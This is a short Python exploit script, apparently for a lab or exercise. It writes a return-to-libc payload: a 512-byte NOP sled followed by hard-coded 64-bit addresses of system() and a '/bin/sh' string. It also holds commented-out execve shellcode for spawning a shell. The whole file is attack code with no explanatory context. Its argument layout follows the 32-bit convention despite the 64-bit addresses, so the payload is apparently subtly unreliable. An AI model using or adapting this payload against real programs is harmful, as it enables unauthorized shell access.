#!/usr/bin/python

import struct
import sys

buffsize = 512
offset = 0


#system: 0x7ffff7e19120
#exit: 0x7ffff7e0e820
#/bin/sh: 0x7ffff7f5b966

#/bin/sh
#sc = b'\xeb\x14\x5f\x48\x31\xc0\x88\x47\x07\x50\x57\x48\x8d\x34\x24\xb0\x3b\x48\x31\xd2\x0f\x05\xe8\xe7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'

nopsled = b'\x90'*(buffsize)
system = struct.pack("<Q", 0x7ffff7e19120)
binsh = struct.pack("<Q", 0x7ffff7f5b966)

sys.stdout.buffer.write(nopsled+system+binsh)
